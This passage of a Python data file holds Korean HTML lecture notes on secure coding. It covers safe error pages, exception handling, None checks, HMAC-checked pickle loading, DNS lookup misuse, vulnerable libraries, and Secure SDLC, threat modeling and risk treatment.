                    <p>Django의 기본 오류 페이지도 같은 위험을 가진다. 사용자 정의 오류 페이지를 따로 설정하지 않으면 URL 패턴, <code>admin/</code> 경로, 코드 위치, DEBUG 상태처럼 일반 사용자가 알 필요가 없는 내부 정보가 보일 수 있다. 강사는 공격자가 이런 화면을 보고 “관리자 경로가 존재한다”, “어떤 라우팅 구조를 쓴다”는 사실을 알아낼 수 있다고 설명했다.</p>
                    {sc07_error_handler}
                    <p>따라서 오류 응답은 개발자가 직접 만든 안전한 오류 페이지로 연결해야 한다. 400, 403, 404, 500 같은 오류가 발생했을 때 사용자에게는 내부 코드와 경로를 보여 주지 않고, 필요한 최소 안내만 보여 주어야 한다. 자세한 원인은 서버 로그에 남겨 관리자가 확인하고, 외부 화면에는 공격자가 참고할 수 있는 데이터가 없어야 한다.</p>
                    {error_handler_config}
                    <p>위 설정은 Django에서 400, 403, 404, 500 오류를 각각 <code>blog.views.error400</code> 같은 사용자 정의 뷰로 연결한다. 핵심은 “오류를 숨긴다”가 아니라 “사용자에게 보여 줄 정보와 관리자에게 남길 정보를 분리한다”는 점이다.</p>
                    """,
                },
                {
                    "heading": "부적절한 예외 처리",
                    "body": f"""
                    <p>오류 메시지를 가리는 것만으로 충분하지 않다. 예외가 발생했을 때 프로그램이 어떤 상태로 이어지는지도 중요하다. 공격자뿐 아니라 일반 사용자도 개발자가 예상하지 못한 값을 입력할 수 있고, 그 값이 예외를 발생시킬 수 있다. 예외 처리가 없으면 프로그램이 종료되거나 서버 기능이 멈출 수 있고, 예외 처리가 있더라도 내부 경로나 데이터를 그대로 보여 주면 공격자에게 힌트가 된다.</p>
                    {sc07_exception_flow}
                    <p>강의는 예외 처리의 나쁜 예를 암호화 코드로 설명한다. 암호화 함수는 <code>key_id</code>를 받아 <code>static_keys</code> 목록에서 키와 IV를 선택한다. 그런데 사용자가 목록 범위를 벗어난 <code>key_id</code>를 주면 <code>IndexError</code>가 발생한다.</p>
                    {sc07_exception_crypto_bad}
                    <p>취약 코드에서는 예외가 발생했을 때 <code>except IndexError:</code> 아래에서 아무 조치 없이 <code>pass</code>로 넘어간다. 그 결과 함수 시작 부분에 선언된 기본 키 <code>0000000000000000</code>과 기본 IV가 그대로 사용된다. 강사는 이런 디폴트 키는 유출되는 순간 모든 데이터가 위험해지고, 유출되지 않아도 공격자가 쉽게 추측할 수 있다고 설명했다.</p>
                    {exception_crypto_default_key}
                    {sc07_exception_crypto_safe}
                    <p>방어 코드는 예외 상황을 취약한 기본 동작으로 흘려보내지 않는다. 키 선택에 실패하면 <code>secrets.token_bytes(16)</code>으로 새로운 키와 IV를 만들고, 이를 키 목록에 추가한 뒤 암호화를 수행한다. 실제 서비스에서는 상황에 따라 요청을 실패 처리할 수도 있다. 중요한 기준은 예외가 발생했을 때 <strong>약한 기본값, 내부 정보 노출, 비정상 상태 유지</strong>로 이어지지 않게 하는 것이다.</p>
                    {exception_crypto_safe}
                    """,
                },
                {
                    "heading": "널 참조와 코드 오류",
                    "body": f"""
                    <p>코드 오류는 단순 버그로 끝나지 않고 보안 약점이 될 수 있다. 대표 사례가 <strong>Null Pointer 역참조</strong>다. 공격자나 일반 사용자가 객체 값, 파일명, 파라미터 값을 비워 둘 수 있는데 서버 코드가 “값은 항상 존재한다”고 가정하면, 비어 있는 값을 처리하는 순간 예외가 발생한다.</p>
                    {sc07_null_flow}
                    <p>강의 화면은 공격자가 객체 값을 Null로 설정하고, 서버가 이를 예상하지 못해 비정상 경로나 오류 정보를 노출하는 흐름을 보여 준다. 공격자는 그 정보를 바탕으로 추가 공격을 시도할 수 있다. Python에서는 C/C++의 널 포인터와 표현은 다르지만, <code>None</code>을 문자열처럼 다루거나 메서드를 호출하면 같은 종류의 오류가 발생한다.</p>
                    {sc07_null_vulnerable}
                    <p>취약 예시는 <code>request.POST.get("filename")</code>으로 파일 이름을 가져온 뒤 곧바로 <code>filename.count(".")</code>를 호출한다. 사용자가 <code>filename</code>을 보내지 않으면 값은 <code>None</code>이 되고, <code>None</code>에는 <code>count()</code> 메서드가 없으므로 예외가 발생한다. 이 예외가 처리되지 않으면 XML 파싱 기능뿐 아니라 서버 전체 동작에도 영향을 줄 수 있다.</p>
                    {null_pointer_vulnerable}
                    {sc07_null_safe}
                    <p>방어 코드는 먼저 <code>filename is None</code>인지 확인하고, 값이 있더라도 <code>strip()</code> 결과가 빈 문자열이면 오류 페이지를 반환한다. 즉 값이 없거나 공백뿐인 경우에는 XML 처리 로직으로 들어가지 않는다. 이후에도 확장자가 <code>.xml</code>인지 확인해 의도한 파일 형식만 처리한다.</p>
                    {null_pointer_safe}
                    <p>이 주제에서 기억해야 할 점은 “오류가 나지 않게 하자”보다 넓다. 외부에서 들어오는 값은 항상 없을 수 있고, 비어 있을 수 있고, 의도한 형식이 아닐 수 있다. 이런 경우를 먼저 막아야 오류 메시지 노출, 서비스 중단, 추가 정보 노출을 함께 줄일 수 있다.</p>
                    """,
                },
                {
                    "heading": "역직렬화와 무결성 검증",
                    "body": f"""
                    <p>다음 주제는 초반 강의에서도 언급했던 역직렬화다. 직렬화된 데이터는 사람이 보는 평문이 아니라 프로그램이 다시 읽어 객체로 복원할 수 있는 형태다. Python의 <code>pickle</code> 데이터처럼 역직렬화 과정에서 객체 복원 이상의 동작이 일어날 수 있는 형식은 특히 위험하다.</p>
                    {sc07_deserialization_flow}
                    <p>공격자가 공격 코드가 포함된 직렬화 데이터를 서버로 보내고, 서버가 이를 검증 없이 역직렬화하면 원격 코드 실행과 시스템 장악으로 이어질 수 있다. 강사는 사람이 바로 해석하기 어려운 데이터 안에 공격 코드가 숨어 있을 수 있고, 이를 그대로 로드하면 서버가 공격 코드를 실행하게 된다고 설명했다.</p>
                    {sc07_pickle_unsafe}
                    <p>취약 코드는 사용자 입력을 <code>pickle.dumps()</code>로 직렬화한 뒤 바로 <code>pickle.loads()</code>로 복원한다. 이 예시 자체는 짧지만 핵심은 명확하다. 신뢰할 수 없는 데이터를 “객체로 복원해도 되는 데이터”라고 가정하면 안 된다.</p>
                    {pickle_unsafe_load}
                    {sc07_pickle_hmac}
                    <p>방어 예시는 HMAC을 사용한다. 서버는 사용자 입력을 직렬화한 뒤 비밀키 <code>secret_key</code>와 <code>hashlib.sha512</code>를 사용해 HMAC 값을 계산한다. 그리고 사용자가 함께 보낸 <code>hashed_pickle</code> 값과 서버가 계산한 값을 <code>hmac.compare_digest()</code>로 비교한다. 값이 같을 때만 <code>pickle.loads()</code>를 수행하고, 다르면 “신뢰할 수 없는 데이터입니다.”라는 오류 페이지를 반환한다.</p>
                    {pickle_hmac_check}
                    <p>해시나 HMAC 검증은 데이터가 중간에 변조되었는지 확인하기 위한 절차다. 해시값이 다르면 직렬화 데이터가 원본과 다르거나 공격자가 조작했을 가능성이 있으므로 실행하지 않아야 한다. 더 나아가 가능하면 신뢰할 수 없는 입력에는 pickle 자체를 쓰지 않고 JSON처럼 코드 실행 의미가 없는 형식을 선택하는 것이 좋다.</p>
                    """,
                },
                {
                    "heading": "DNS Lookup 오용",
                    "body": f"""
                    <p>API 오용은 웹서버가 외부 API를 호출하거나 자체 API를 제공할 때 잘못된 방식으로 보안 결정을 내리는 문제다. 강의의 대표 예시는 <strong>DNS Lookup에 의존한 보안 결정</strong>이다. 사용자가 <code>www.bank.kr</code> 같은 URL을 입력하면, 정상적으로는 DNS가 이 도메인에 맞는 IP를 돌려주고 사용자는 정상 은행 서버에 접속한다.</p>
                    {sc07_dns_flow}
                    <p>하지만 DNS 해석 과정에 공격자가 개입하면 상황이 달라진다. 화면에서는 정상 웹 서버의 IP가 <code>10.10.10.10</code>이고 공격자 서버의 IP가 <code>192.168.1.1</code>로 표시된다. 공격자가 DNS 캐시나 응답을 조작해 <code>www.bank.kr</code>의 주소가 공격자 IP라고 속이면, 사용자는 원래 은행 서버가 아니라 위장 사이트에 접속할 수 있다.</p>
                    <p>강사는 URL 기반으로 DNS를 검색하고 그 결과에만 의존해 보안 판단을 하면, 중간에서 잘못된 IP로 연결하는 공격에 노출될 수 있다고 설명했다. 특히 고정된 대상에 접속해야 하는 기능이라면 도메인 문자열만 믿는 방식은 충분하지 않다.</p>
                    {sc07_dns_code}
                    <p>코드 화면의 위쪽 예시는 <code>trusted_host == host_name</code>처럼 호스트 이름 비교에 의존한다. 주석처럼 공격자에 의해 실행되는 서버의 DNS가 변경될 수 있으므로 안전하지 않다. 아래쪽 예시는 <code>socket.gethostbyname(host_domain_name)</code>으로 실제 해석된 IP를 얻고, 이를 신뢰할 수 있는 IP와 비교한다. 강의에서는 고정 대상에 접속해야 할 때 URL보다 IP 기반 확인이 변조 여지를 줄일 수 있다고 설명했다.</p>
                    {dns_lookup_fix}
                    <p>실제 서비스에서는 IP 비교만으로 모든 보안 문제가 해결되는 것은 아니다. HTTPS 인증서 검증, 신뢰할 수 있는 DNS 설정, 핀ning, 내부 allowlist 등 상황에 맞는 검증이 함께 필요하다. 이 강의에서의 핵심은 DNS 해석 결과를 아무 검증 없이 신뢰해 보안 판단을 내리면 안 된다는 점이다.</p>
                    """,
                },
                {
                    "heading": "취약한 API와 라이브러리 사용",
                    "body": f"""
                    <p>마지막 주제는 취약한 API와 라이브러리 사용이다. 웹서버는 직접 작성한 코드만으로 동작하지 않는다. 외부 API, 오픈소스 패키지, 프레임워크, 라이브러리를 가져와 사용한다. 그런데 그 API나 패키지 자체에 취약점이 있다면, 개발자가 직접 취약한 코드를 작성하지 않았더라도 호출하는 순간 위험이 애플리케이션으로 들어온다.</p>
                    {sc07_vulnerable_api}
                    <p>화면은 <code>import vuln_pkg</code> 후 <code>vuln_pkg.vuln_func()</code>를 호출하는 프로그램을 보여 준다. 취약한 패키지 내부에서 버퍼 오버플로우, XML 취약점, 임의 코드 실행 같은 문제가 발생할 수 있고, API를 호출한 애플리케이션도 그 영향을 받는다. 즉 “내 코드가 짧고 단순하다”는 사실만으로 안전하다고 볼 수 없다.</p>
                    <p>강사는 API, 패키지, 라이브러리를 사용하기 전에 알려진 취약점이 있는지 확인해야 한다고 설명했다. 슬라이드에는 NIST의 National Vulnerability Database와 CVE Details 같은 취약점 검색 서비스가 예시로 나온다. 새 라이브러리를 도입할 때는 해당 이름과 버전으로 공개 취약점이 있는지 확인하고, 취약점이 알려졌다면 패치 버전을 사용해야 한다.</p>
                    <p>가능하면 최신 버전을 유지하는 것도 중요하다. 활발히 관리되는 라이브러리는 취약점이 발견되면 보안 패치를 배포하므로, 업데이트를 적용하는 것만으로도 위험을 줄일 수 있다. 반대로 오래 방치된 패키지나 더 이상 유지보수되지 않는 API는 취약점이 발견되어도 고쳐지지 않을 수 있으므로 사용 자체를 재검토해야 한다.</p>
                    <p>7강 전체를 관통하는 결론은 “예외적 상황을 정상 흐름만큼 중요하게 다루어야 한다”는 것이다. 오류, 빈 값, 변조된 직렬화 데이터, 조작된 DNS 응답, 취약한 라이브러리는 모두 정상 사용 시나리오 바깥에서 발생한다. 시큐어 코딩은 이런 비정상 입력과 실패 상황을 안전하게 처리하는 습관이다.</p>
                    """,
                },
            ],
            "checks": [
                "오류 메시지가 내부 경로와 코드 정보를 노출하면 왜 위험한지 설명할 수 있는가?",
                "예외 발생 시 기본 키로 암호화하는 방식이 왜 위험한지 이해했는가?",
                "None이나 빈 문자열 입력을 먼저 검사해야 하는 이유를 말할 수 있는가?",
                "pickle 역직렬화 전에 무결성 검증이 필요한 이유를 설명할 수 있는가?",
                "DNS lookup과 취약 라이브러리 사용이 API 오용으로 이어지는 이유를 이해했는가?",
            ],
        },
        {
            "id": "1-8",
            "title": "시큐어 SDLC",
            "subtitle": "리스크 감소, Secure SDLC, 보안 요구사항, 보안 원칙, BLP 모델, 위협 모델링, 리스크 처리 방법을 정리한다.",
            "tags": ["Secure SDLC", "위협 모델링", "리스크"],
            "objectives": [
                "보안 리스크를 줄이기 위해 코드 구현뿐 아니라 설계부터 보안을 고려해야 함을 이해한다.",
                "정의, 개발, 유지보수 단계와 Microsoft SDL의 7단계 흐름을 설명한다.",
                "보안 요구사항은 추상적 표현보다 구체적 명세가 필요함을 이해한다.",
                "최소 권한, 오픈 디자인, Built-in Not Bolted-on 같은 보안 설계 원칙을 정리한다.",
                "BLP 모델과 위협 모델링의 목적을 설명한다.",
                "리스크 수용, 제거, 전가, 감소라는 네 가지 처리 방법을 구분한다.",
            ],
            "sections": [
                {
                    "heading": "리스크를 줄이는 관점",
                    "body": f"""
                    <p>8강은 시큐어 코딩 전체의 마지막 강의로, 코드 구현뿐 아니라 소프트웨어 개발 전 과정에서 안전한 소프트웨어를 만드는 방법을 다룬다. 보안 관점에서 취약점, 보안 약점, 여러 위험을 리스크라고 볼 수 있다. 리스크를 줄이려면 보안 솔루션이나 침입 탐지 시스템을 적용할 수도 있고, 앞선 강의의 시큐어 코딩 기법을 적용할 수도 있다.</p>
                    {sc08_outline}
                    <p>강의 목차는 네 가지다. 먼저 리스크를 어떻게 줄일 수 있는지 생각하고, 이어서 Secure Software Development Cycle을 설명한다. 그 다음 요구사항을 어떻게 도출해야 하는지, 마지막으로 Threat Modeling을 통해 설계에서 발생 가능한 위협을 찾는 방법을 다룬다.</p>
                    {sc08_reduce_risk}
                    <p>강사는 “보안적으로 우수한 소프트웨어를 만들려면 좋은 보안 솔루션을 적용하면 되는가?”라는 질문으로 시작한다. IDS 같은 침입 탐지 시스템이나 보안 솔루션을 적용하는 것도 방법이고, 앞선 강의에서 배운 시큐어 코딩 기법을 적용하는 것도 중요한 방법이다. 하지만 더 근본적인 방법은 처음 설계부터 보안을 고려하는 것이다.</p>
                    <p>또 하나의 기준은 소프트웨어 복잡도를 낮추는 것이다. 강의 예시의 <code>printf("Hello World\\n");</code> 같은 코드는 매우 단순하므로 공격자가 노릴 공격 벡터가 거의 없다. 반대로 소프트웨어가 복잡해질수록 기능, 입력, 상태, 외부 연동이 늘어나고 공격자가 노릴 지점도 많아진다. 따라서 리스크 감소는 “보안 장비를 붙이는 것”만이 아니라 <strong>설계부터 보안을 고려하고, 불필요한 복잡도를 줄이는 것</strong>까지 포함한다.</p>
                    """,
                },
                {
                    "heading": "Secure SDLC와 Microsoft SDL",
                    "body": f"""
                    <p>Secure Software Development Life Cycle은 설계부터 구현, 배포, 유지보수까지 전체 과정에서 리스크를 줄이려는 개발 방법론이다. 강의는 개발 주기를 크게 정의 단계, 개발 단계, 유지보수 단계로 나눈다. 정의 단계에서는 무엇을 만들지와 요구사항을 정하고, 개발 단계에서는 설계·구현·테스트를 수행하며, 유지보수 단계에서는 배포 후 운영과 폐기까지 다룬다.</p>
                    {sc08_sdlc_three}
                    <p>정의 단계는 <strong>무엇을 만들 것인지</strong> 정하는 단계다. 서비스 목적, 개발 계획, 요구사항 분석이 여기에 포함된다. 개발 단계는 <strong>어떻게 만들 것인지</strong>를 구체화하는 단계로, 설계, 개발, 테스트가 이어진다. 유지보수 단계는 배포 이후 실제 서비스를 운영하고, 문제가 생기면 수정하거나 예방하며, 필요하면 기능이나 서비스를 폐기하는 단계다.</p>
                    {sc08_microsoft_sdl}
                    <p>Microsoft의 Security Development Lifecycle은 이 흐름을 7단계로 더 세분화한다. 교육 단계에서는 개발자에게 보안적으로 무엇을 신경 써야 하는지 가르친다. 계획/분석 단계에서는 소프트웨어의 품질 기준, 버그 경계, 보안과 프라이버시 위험을 분석한다. 설계 단계에서는 공격 영역 분석과 위협 모델링을 수행한다.</p>
                    <p>구현 단계는 앞선 시큐어 코딩 기법과 직접 연결된다. 금지된 함수 사용을 제한하고, 정적 분석으로 위험한 코드 패턴을 확인한다. 시험/검증 단계에서는 동적 테스트와 퍼징, 공격 영역과 위협 모델 검증을 수행한다. 배포/운영 단계에서는 사고 대응 계획과 최종 보안 검토, 기록 보관을 준비하고, 대응 단계에서는 실제 사고가 발생했을 때 대응을 수행한다.</p>
                    {sdlc_flow}
                    <p>이 강의에서 특히 강조하는 지점은 계획/분석과 설계 단계다. 구현 단계에서 취약 코드를 줄이는 것도 중요하지만, 요구사항과 설계가 애초에 불명확하거나 위험하면 구현 단계에서 모든 문제를 고치기 어렵다.</p>
                    """,
                },
                {
                    "heading": "보안 요구사항은 구체적이어야 한다",
                    "body": f"""
                    <p>요구사항 도출 단계에서도 보안을 고려해야 한다. 단순히 “민감정보는 암호화되어야 한다”라고 쓰면 너무 추상적이다. 개발자마다 암호화 방식, 적용 위치, 전송 시점, 저장 시점을 다르게 해석할 수 있다.</p>
                    {sc08_requirements_specific}
                    <p>슬라이드는 두 요구사항을 비교한다. 첫 번째는 “모든 민감정보는 암호화되어야 한다.”이다. 이 문장은 방향은 맞지만 구체성이 부족하다. 저장할 때만 암호화하면 되는지, 전송할 때만 암호화하면 되는지, 어떤 알고리즘을 써야 하는지 개발자마다 다르게 판단할 수 있다.</p>
                    <p>두 번째 요구사항은 “모든 민감정보는 전송과 수신 시 암호화되어야 하며, 암호화 방법은 AES 이상의 암호를 사용해야 한다.”이다. 이 문장은 적용 시점과 암호화 방법을 함께 명시한다. 따라서 어떤 개발자가 구현하더라도 전송과 수신 모두에서 암호화를 적용하고, 최소한의 알고리즘 기준도 지키게 된다.</p>
                    <p>강사의 핵심 설명은 요구사항이 최종 결과물을 크게 바꾼다는 것이다. 보안 요구사항은 좋은 의도를 적는 문장이 아니라 구현자가 오해 없이 같은 결과를 만들 수 있도록 하는 명세여야 한다.</p>
                    """,
                },
                {
                    "heading": "보안 설계 원칙",
                    "body": f"""
                    <p>강의는 요구사항 도출 과정에서 알아야 할 여러 보안 원칙이 있다고 설명하고, 그중 중요한 원칙을 몇 가지 소개한다.</p>
                    {sc08_principles}
                    <table>
                      <thead><tr><th>원칙</th><th>설명</th></tr></thead>
                      <tbody>
                        <tr><td>Least Privilege</td><td>사용자에게 필요한 최소 권한만 준다. 과한 권한은 악의적 행위와 사고의 범위를 넓힌다.</td></tr>
                        <tr><td>Fail-Safe Defaults</td><td>기본 상태는 허용이 아니라 거부가 되어야 하며, 명시적으로 허용된 경우에만 접근하게 한다.</td></tr>
                        <tr><td>Economy of Mechanism</td><td>보안 메커니즘은 단순할수록 검토와 유지보수가 쉽고 오류 가능성이 줄어든다.</td></tr>
                        <tr><td>Complete Mediation</td><td>권한 확인은 한 번만 하는 것이 아니라 접근할 때마다 일관되게 수행되어야 한다.</td></tr>
                        <tr><td>Open Design</td><td>설계가 공개되어도 안전해야 한다. AES처럼 알고리즘이 공개되어도 키가 안전하면 보안성이 유지되는 방식이다.</td></tr>
                        <tr><td>Separation of Privilege</td><td>중요한 동작은 하나의 조건이나 권한만으로 허용하지 않고 여러 조건을 조합해 확인한다.</td></tr>
                        <tr><td>Defense in Depth</td><td>한 방어선이 실패해도 다음 방어선이 남도록 여러 계층의 보호 장치를 둔다.</td></tr>
                        <tr><td>Effective Logging</td><td>문제 발생 시 추적할 수 있도록 의미 있는 보안 이벤트를 기록한다.</td></tr>
                        <tr><td>Built-in, Not Bolted-on</td><td>기능을 다 만든 뒤 보안을 덧붙이는 것이 아니라 처음부터 보안을 포함해 설계한다.</td></tr>
                      </tbody>
                    </table>
                    <p>강사는 특히 Least Privilege, Open Design, Built-in Not Bolt On을 강조했다. 최소 권한은 사용자가 작업에 필요한 권한만 갖도록 제한하는 원칙이다. Open Design은 설계 방식이 공개되어도 핵심 비밀, 예를 들어 암호화 키만 안전하면 전체 보안이 유지되도록 만드는 원칙이다. Built-in Not Bolt On은 기능을 다 만든 뒤 보안을 덧붙이는 방식보다 처음부터 보안을 포함해 설계해야 한다는 의미다.</p>
                    <p>이 원칙들은 단순 구호가 아니라 요구사항과 설계 문서에 반영되어야 한다. 요구사항 도출 단계에서 원칙을 놓치면 이후 구현 단계에서 보안 기능을 억지로 붙이게 되고, 처음부터 고려한 설계보다 안전하기 어렵다.</p>
                    """,
                },
                {
                    "heading": "BLP 모델",
                    "body": f"""
                    <p>강의는 보안 정책 모델의 예로 BLP 모델을 소개한다. BLP 모델은 기밀성을 유지하기 위한 모델이다. 핵심은 상위 권한의 데이터를 읽지 못하고, 하위 권한의 데이터에 쓰지 못하게 하는 것이다.</p>
                    {sc08_blp}
                    <p>상위 권한의 데이터를 읽지 못하게 하는 것은 직관적이다. 자기 권한보다 높은 기밀 정보를 읽을 수 있으면 기밀성이 깨진다. 반대로 하위 권한 데이터에 쓰지 못하게 하는 것도 중요하다. 높은 권한을 가진 사용자가 자신이 아는 기밀 정보를 낮은 등급의 데이터 영역에 써 버리면, 낮은 권한 사용자에게 기밀 정보가 공개될 수 있기 때문이다.</p>
                    <p>슬라이드에는 Bell-LaPadula 모델의 세 규칙이 보인다. Simple Confidentiality Rule은 No read up, 즉 낮은 권한 사용자가 상위 등급 데이터를 읽지 못하게 한다. Star Confidentiality Rule은 No write down, 즉 높은 권한 사용자가 하위 등급 영역에 데이터를 쓰지 못하게 한다. Strong Star Confidentiality Rule은 같은 등급 안에서 읽기와 쓰기를 제한해 정보가 위아래로 흐르지 않도록 한다.</p>
                    <p>이처럼 어떤 권한이 어떤 데이터를 읽고 쓸 수 있는지 정책으로 명확히 정해야 한다. 강의는 BLP 외에도 다양한 보안 정책 모델이 있으니 추가로 찾아보는 것을 권했다.</p>
                    """,
                },
                {
                    "heading": "위협 모델링",
                    "body": f"""
                    <p>설계가 끝나면 그 설계에서 어디에 위협이 발생할 수 있는지 확인해야 한다. 먼저 데이터 흐름 다이어그램을 그린다. 어떤 데이터가 어디에서 어디로 이동하고, 어디에서 처리되고, 어디에 저장되는지 확인해야 한다. 보안의 큰 목적 중 하나가 데이터 기밀성 유지이기 때문이다.</p>
                    {sc08_architecture}
                    <p>강의는 복잡한 클라우드/웹 서비스 설계 도면을 예로 보여 준다. 사용자, 인터넷, CDN, 로드밸런서, 애플리케이션 서버, 데이터베이스, 로그 저장소처럼 여러 구성요소가 연결되어 있으면 데이터가 이동하는 경로도 많아진다. 위협 모델링은 이 구조를 보고 공격자가 어느 경로에서 개입할 수 있는지 생각하는 과정이다.</p>
                    {sc08_threat_modeling_steps}
                    <p>다음으로 보호해야 할 대상을 구분한다. 모든 데이터를 같은 수준으로 보호할 필요는 없고, 민감정보와 중요 자산을 식별해야 한다. 이후 알려진 공격, 원데이 취약점, 공개된 공격 방식이 데이터 흐름의 어느 지점에서 발생할 수 있는지 시나리오를 작성한다. 마지막으로 위험도가 높은 순서대로 대응책을 마련한다.</p>
                    <ol>
                      <li>Data Flow Diagram으로 정보의 흐름을 확인한다.</li>
                      <li>보호해야 하는 대상, 즉 민감정보와 중요 자산을 확인한다.</li>
                      <li>알려진 공격을 검토해 다이어그램에서 발생 가능한 공격과 공격 시나리오를 도출한다.</li>
                      <li>위험도를 산출하고 높은 순서대로 대응책을 마련한다.</li>
                      <li>수정된 설계를 기준으로 다시 1번부터 반복한다.</li>
                    </ol>
                    <p>이 과정을 반복하면 설계상의 취약점을 최대한 줄일 수 있다. 다만 시간, 비용, 인력에는 한계가 있으므로 완전히 무결한 소프트웨어를 만드는 것은 현실적으로 어렵다. 그래서 위험도를 기준으로 우선순위를 정해야 한다.</p>
                    """,
                },
                {
                    "heading": "리스크 처리 네 가지 방법",
                    "body": f"""
                    {sc08_risk_methods}
                    <p>강사는 “항상 보안적으로 무결한 소프트웨어를 만들어야 하는가?”라는 질문을 던진다. 이상적으로는 그렇지만 현실에서는 시간, 예산, 인력, 운영 요구사항이 제한된다. 따라서 모든 위험을 같은 방식으로 고치는 것이 아니라 위험의 성격과 크기에 따라 처리 방법을 선택해야 한다.</p>
                    <table>
                      <thead><tr><th>방법</th><th>의미</th><th>강의에서의 설명</th></tr></thead>
                      <tbody>
                        <tr><td>Risk Accept</td><td>위험을 그대로 받아들인다.</td><td>노출되어도 큰 문제가 없는 데이터나 낮은 위험은 그대로 둘 수 있다.</td></tr>
                        <tr><td>Risk Avoid</td><td>위험한 기능 자체를 없앤다.</td><td>취약점이 심각하고 패치가 어렵다면 기능이나 서비스를 폐기할 수 있다.</td></tr>
                        <tr><td>Risk Transfer</td><td>손실을 다른 방식으로 이전한다.</td><td>기능은 유지하되 보험 등으로 경제적 손실을 대비한다.</td></tr>
                        <tr><td>Risk Reduce</td><td>패치와 개선으로 위험을 줄인다.</td><td>개발자가 흔히 생각하는 취약점 패치 방식이다.</td></tr>
                      </tbody>
                    </table>
                    <p>강의의 결론은 보안 약점을 항상 코드 패치로만 없애야 하는 것은 아니라는 점이다. 위험이 작으면 수용할 수 있고, 위험이 너무 크면 기능을 제거할 수 있으며, 제거가 어렵다면 보험 같은 방식으로 전가할 수도 있다. 물론 실제 패치로 위험을 줄이는 것도 중요한 선택지다.</p>
                    {sc08_summary}
                    <p>8강은 시큐어 코딩 전체의 결론이다. 안전한 소프트웨어는 구현 단계에서 취약 코드를 줄이는 것만으로 만들어지지 않는다. 요구사항 도출, 설계, 구현, 검증, 배포, 운영, 사고 대응까지 전 과정에서 보안을 고려해야 한다. 또한 취약점을 발견했을 때는 무조건 한 가지 방식으로만 대응하지 말고, 위험도와 현실적 제약을 기준으로 수용, 제거, 전가, 감소 중 적절한 방법을 선택해야 한다.</p>
                    """,
                },
            ],
            "checks": [
                "보안 리스크를 줄이기 위해 설계 단계부터 보안을 고려해야 하는 이유를 설명할 수 있는가?",
                "정의, 개발, 유지보수 단계와 Microsoft SDL 7단계를 큰 흐름으로 말할 수 있는가?",
                "추상적인 보안 요구사항과 구체적인 보안 요구사항의 차이를 예시로 설명할 수 있는가?",
                "Least Privilege, Open Design, Built-in Not Bolted-on 원칙을 구분할 수 있는가?",
                "BLP 모델에서 상위 읽기 금지와 하위 쓰기 금지가 기밀성과 어떻게 연결되는지 이해했는가?",
                "리스크 수용, 제거, 전가, 감소의 차이를 설명할 수 있는가?",
            ],
        },
    ]
